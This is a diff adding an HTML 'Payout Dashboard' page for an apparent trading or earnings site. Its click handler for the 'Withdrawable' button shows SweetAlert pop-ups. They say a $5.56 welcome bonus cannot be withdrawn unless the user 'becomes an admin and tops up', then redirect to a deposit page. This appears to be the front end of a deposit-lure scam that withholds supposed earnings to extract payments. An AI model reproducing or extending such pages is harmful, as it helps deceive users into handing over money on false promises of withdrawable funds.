@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>payout</title>
+    <link rel="icon" href="/images/logo.png">
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.4.0/fonts/remixicon.css" rel="stylesheet" />
+    <link rel="stylesheet" href="/css/dashboard.css">
+    <link rel="stylesheet" href="/css/payouts.css">
+</head>
+
+<body>
+
+
+    <!-- BACKGROUND BLUR -->
+    <span class="bg__blur"></span>
+    <span class="bg__blur footer__blur"></span>
+
+    <div class="centered-content1">
+        <div class="overlay">
+
+            <div class="payout-container">
+                <h2>Payout Dashboard</h2>
+                <p class="payout-description">
+                    Track your earnings and withdrawals effortlessly. Below is a breakdown of your financial activities:
+                </p>
+
+                <div class="payout-item">
+                    <i class="ri-wallet-line"></i>
+                    <span>Total Funds</span>
+                    <p>Your overall account balance, including deposits, bonuses, and earnings.</p>
+                </div>
+
+                <div class="payout-item">
+                    <i class="ri-gift-line"></i>
+                    <span>Welcome Bonus</span>
+                    <p>A special reward for joining us, credited to your account upon registration.</p>
+                </div>
+
+                <div class="payout-item">
+                    <i class="ri-calendar-check-line"></i>
+                    <span>Weekly Payouts</span>
+                    <p>Your earnings distributed on a weekly basis.</p>
+                </div>
+
+                <div class="payout-item">
+                    <i class="ri-calendar-2-line"></i>
+                    <span>Monthly Payouts</span>
+                    <p>Long-term rewards accumulated and paid out at the end of each month.</p>
+                </div>
+
+                <div class="payout-item">
+                    <i class="ri-trophy-line"></i>
+                    <span>Competition Earnings</span>
+                    <p>Prizes and bonuses earned from participating in trading challenges.</p>
+                </div>
+
+                <div class="payout-item">
+                    <i class="ri-money-dollar-circle-line"></i>
+                    <span>Withdrawable Balance</span>
+                    <p>The amount available for withdrawal at any time.</p>
+                </div>
+
+                <div class="flex">
+                    <a href="/dashboard" class="withdraw-button"><i class="ri-bar-chart-2-line"></i> Back Home</a>
+                    <!-- <button class="withdraw-button click"><i class="ri-wallet-3-line"></i> Withdrawable</button> -->
+                    <button class="withdraw-button click" onclick="showWithdrawAlert()">
+                        <i class="ri-wallet-3-line"></i> Withdrawable
+                    </button>
+                    
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+        document.querySelector(".withdraw-button.click").addEventListener("click", function () {
+            Swal.fire({
+                title: "Withdrawable Funds",
+                text: "You have only $5.56 gotten as a welcome bonus, but it can't be withdrawn. Become an admin and top up—all the funds will then be available for you to withdraw.",
+                icon: "info",
+                confirmButtonText: "Okay",
+                confirmButtonColor: "#696fdd",
+                width: "400px",
+                didOpen: () => {
+                    document.querySelector(".swal2-title").style.fontSize = "16px";
+                    document.querySelector(".swal2-title").style.lineHeight = "1.4";
+                    document.querySelector(".swal2-html-container").style.fontSize = "14px";
+                    document.querySelector(".swal2-html-container").style.lineHeight = "1.5";
+                    document.querySelector(".swal2-confirm").style.fontSize = "13px";
+                    document.querySelector(".swal2-confirm").style.padding = "8px 16px";
+                }
+            }).then(() => {
+                // Second alert after clicking "Okay"
+                Swal.fire({
+                    title: "    Become an Admin",
+                    text: "As an admin, you will have access to all fund movements on the payout page and can withdraw to your bank every week, depending on your choice.",
+                    icon: "success",
+                    confirmButtonText: "Become an Admin",
+                    showCancelButton: true,
+                    cancelButtonText: "Cancel",
+                    confirmButtonColor: "#28a745",
+                    cancelButtonColor: "#d33",
+                    width: "400px",
+                    didOpen: () => {
+                        document.querySelector(".swal2-title").style.fontSize = "16px";
+                        document.querySelector(".swal2-title").style.lineHeight = "1.4";
+                        document.querySelector(".swal2-html-container").style.fontSize = "14px";
+                        document.querySelector(".swal2-html-container").style.lineHeight = "1.5";
+                        document.querySelector(".swal2-confirm").style.fontSize = "13px";
+                        document.querySelector(".swal2-confirm").style.padding = "8px 16px";
+                        document.querySelector(".swal2-cancel").style.fontSize = "13px";
+                        document.querySelector(".swal2-cancel").style.padding = "8px 16px";
+                    }
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        window.location.href = "/deposit"; // Redirect to deposit page
+                    }
+                });
+            });
+        });
+        </script>
+        
+        
+        
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+</body>
+
+</html>
